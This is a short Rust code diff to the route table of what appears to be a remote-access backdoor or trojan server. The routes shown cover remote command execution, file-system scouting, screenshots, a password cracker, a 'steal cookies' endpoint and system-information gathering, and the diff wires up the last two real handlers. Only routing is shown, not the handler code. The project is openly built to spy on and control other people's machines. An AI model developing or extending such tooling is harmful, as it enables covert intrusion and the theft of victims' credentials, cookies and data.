@@ -1,4 +1,5 @@
 mod exec;
+mod fetch;
 mod fsxp;
 mod scrn;
 
@@ -15,10 +16,10 @@ pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
         .route("/set", get("update username & password"))
         .route("/pswd", post("password cracker"))
         .route("/exec", post(exec::exec_cmd))
-        .route("/fsxp", post(fsxp::post_file))
+        .route("/fsxp", post(fsxp::scout_path))
         // routes for easier access
         .route("/cookie", post("steal cookies"))
-        .route("/fetch", post("operating system details"))
+        .route("/fetch", post(fetch::fetch_sys_info))
         // routes for real time data
         .route("/scrn", post(scrn::screenshot))
         // extensions
